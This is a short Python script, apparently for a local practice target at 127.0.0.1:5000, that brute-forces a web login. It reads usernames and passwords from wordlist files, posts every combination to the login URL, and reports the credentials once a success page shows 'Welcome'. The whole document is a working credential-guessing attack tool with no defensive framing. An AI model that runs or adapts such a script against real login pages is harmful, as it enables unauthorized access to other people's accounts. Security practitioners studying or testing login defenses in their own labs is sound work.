#!/usr/bin/python3

import requests

def brute_force(url, success_url, username_file, password_file):
    print("[*] Starting brute force attack...")

    # Read usernames and passwords from files
    try:
        with open(username_file, 'r') as uf:
            usernames = [line.strip() for line in uf]
        with open(password_file, 'r') as pf:
            passwords = [line.strip() for line in pf]
    except FileNotFoundError as e:
        print(f"[-] Error: {e}")
        return

    session = requests.Session()
    
    for username in usernames:
        for password in passwords:
            print(f"[*] Trying: Username: {username} | Password: {password}")
            data = {
                "username": username,
                "password": password
            }
            
            # Sending login request
            response = session.post(url, data=data)
            
            # Checking success by accessing the success page
            r = session.get(success_url)
            if "Welcome" in r.text:  # Replace "Welcome" with a keyword indicating success
                print(f"[+] Found! Username: {username} | Password: {password}")
                return True
    print("[-] Brute force attack failed. No valid credentials found.")
    return False


if __name__ == "__main__":
    # URL of the login page and success page
    login_url = "http://127.0.0.1:5000/login"
    success_url = "http://127.0.0.1:5000/success"
    
    # Wordlist files
    username_wordlist = "usernames.txt"  # File containing list of usernames
    password_wordlist = "passwords.txt"  # File containing list of passwords
    
    # Start brute forcing
    brute_force(login_url, success_url, username_wordlist, password_wordlist)
